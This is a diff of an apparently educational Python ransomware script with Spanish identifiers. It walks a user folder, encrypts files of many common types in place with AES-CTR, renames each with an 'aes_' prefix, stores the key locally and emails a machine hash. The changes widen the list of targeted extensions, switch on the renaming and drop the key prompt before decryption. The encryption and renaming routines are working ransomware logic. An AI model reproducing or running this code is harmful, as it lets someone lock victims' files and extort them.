@@ -9,7 +9,22 @@ from mail.SendMail import SendMail
 
 home = os.environ['HOME'] + '/Documents/TESTRAM'
 folders = [x for x in os.listdir(home) if not x.startswith('.')]
-extensiones = ['.mp3', '.mp4', '.avi', '.jpeg', '.zip', '.dat', '.rar', '.txt', '.png', '.jpg', '.pdf', 'xlsx']
+extensiones = [
+    '.mp3', 
+    '.mp4', 
+    '.avi', 
+    '.jpeg', 
+    '.zip', 
+    '.dat', 
+    '.rar', 
+    '.txt', 
+    '.png', 
+    '.jpg', 
+    '.pdf', 
+    '.xls', 
+    '.xlsx',
+    '.mov',
+]
 
 def check_conection_internet():
     """
@@ -40,7 +55,7 @@ def get_hash():
     return  hascomputer[:32]
 
 def change_name(archivo):
-    prefijo = 'encript_'
+    prefijo = 'aes_'
     nombre_archivo = os.path.basename(archivo)
     nuevo_nombre = prefijo + nombre_archivo
     directorio = os.path.dirname(archivo)
@@ -48,7 +63,7 @@ def change_name(archivo):
     os.rename(archivo, ruta_nuevo_archivo)
 
 def change_back_name(archivo):
-    prefijo = 'encript_'
+    prefijo = 'aes_'
     nombre_archivo = os.path.basename(archivo)
     
     # Verificar si el prefijo está presente y quitarlo
@@ -59,8 +74,6 @@ def change_back_name(archivo):
         directorio = os.path.dirname(archivo)
         ruta_nuevo_archivo = os.path.join(directorio, nuevo_nombre)
         os.rename(archivo, ruta_nuevo_archivo)
-    else:
-        pass
 
 def encrypt_and_decrypt(archivo, crypto, block_size=16, desencriptar=False):
     with open(archivo, 'r+b') as archivo_enc:
@@ -75,11 +88,10 @@ def encrypt_and_decrypt(archivo, crypto, block_size=16, desencriptar=False):
             archivo_enc.write(contenido_cifrado)
             contenido_sin_cifrar = archivo_enc.read(block_size)
     
-    # if desencriptar:
-    #     change_back_name(archivo)
-    # else:
-    #     change_name(archivo)
-
+    if desencriptar:
+        pass
+    else:
+        change_name(archivo)
 
 def generate_list_file():
     """
@@ -104,19 +116,30 @@ def discover(key):
 
     if os.path.exists('key_file'):
         print('decrypt')
-        key1 = input('Key:')
+        # key1 = input('Key:')
         key_file = open('key_file', 'r')
         key = key_file.read().split('\n')
         key = ''.join(key)
-        if key1 == key:
-            c = Counter.new(128)
-            crypto = AES.new(key.encode('utf-8'), AES.MODE_CTR, counter=c)
-            cryptarchives = crypto
-            # cryptarchives = crypto.decrypt
+        # if key1 == key:
+        c = Counter.new(128)
+        crypto = AES.new(key.encode('utf-8'), AES.MODE_CTR, counter=c)
+        cryptarchives = crypto
+        # cryptarchives = crypto.decrypt
 
-            for element in lista:
-                encrypt_and_decrypt(archivo=element, crypto=cryptarchives, desencriptar=True)
-        pass
+        for element in lista:
+            change_back_name(archivo=element)
+        
+        generate_list_file()
+        lista = open('file_list', 'r')
+        lista = lista.read().split('\n')
+        lista = [l for l in lista if not l == ""]
+
+        for element in lista:
+            encrypt_and_decrypt(archivo=element, crypto=cryptarchives, desencriptar=True)
+
+        os.remove('file_list')
+        os.remove('key_file')
+        print('=============================\nArchivos desencriptados.\n=============================')
 
     else:
         keya = key.encode('utf-8')
@@ -131,9 +154,8 @@ def discover(key):
         for element in lista:
             encrypt_and_decrypt(archivo=element, crypto=cryptarchives)
         
-        print('Archivos encriptados.')
-    # generate_list_file()
-    
+        print('=============================\nArchivos encriptados.\n=============================')
+
 
 def send_email(hascomputer):
     """
